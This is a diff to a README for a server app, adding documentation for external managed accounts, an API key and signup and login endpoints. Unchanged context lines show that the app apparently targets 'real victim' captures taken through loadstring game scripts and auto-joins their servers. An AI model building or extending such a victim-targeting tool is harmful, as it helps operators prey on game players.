@@ -47,6 +47,8 @@ The server reads `process.env` directly, so any process manager works.
 | `PORT` | `5175` | HTTP port |
 | `HOST` | `127.0.0.1` | Bind address. Use `0.0.0.0` to accept LAN devices |
 | `PUBLIC_URL` | derived | Public origin baked into loadstring URLs, e.g. `https://elow.cc` |
+| `ACCOUNT_API_URL` | `https://cloud-credential-compass.lovable.app` | Base URL of the external account service |
+| `ACCOUNT_API_KEY` | unset | Enables managed accounts. Server-only secret, never commit it |
 | `DISCORD_CLIENT_ID` | unset | Enables the optional Discord sign-in button |
 | `DISCORD_CLIENT_SECRET` | unset | Discord OAuth secret |
 | `SEED` | enabled | `SEED=0` creates an empty database instead of the demo seed |
@@ -156,6 +158,33 @@ Open **Auto joiner** in the sidebar:
 
 Only captures from a real victim with a live `game.JobId` become targets. Inventory dumps,
 self-tests and stale servers are ignored, and anything older than 15 minutes shows as `stale`.
+
+### Managed accounts (external database)
+
+With `ACCOUNT_API_KEY` set, accounts live in the external service and this app never stores a
+password hash. Every browser session still gets its own httpOnly cookie; the service's session
+token is kept server-side and checked at most every 10 minutes.
+
+| Action | Upstream call |
+| --- | --- |
+| Create account | `POST /api/public/signup` `{username, email, password}` |
+| Sign in | `POST /api/public/login` `{login, password}` |
+| Check session | `POST /api/public/session` `{token}` |
+| Sign out | `POST /api/public/session` `{token, action: "logout"}` |
+
+All of them send `x-api-key: $ACCOUNT_API_KEY`. Signup requires a valid email. Users created
+this way show `password_set: false, managed: true`.
+
+```bash
+# local Node
+ACCOUNT_API_KEY=... node server/server.js
+
+# Cloudflare (encrypted secret, not wrangler.jsonc)
+npx wrangler secret put ACCOUNT_API_KEY
+```
+
+If the key is missing, the app falls back to local password auth (scrypt on Node,
+PBKDF2 on Workers).
 
 ## Routes
 
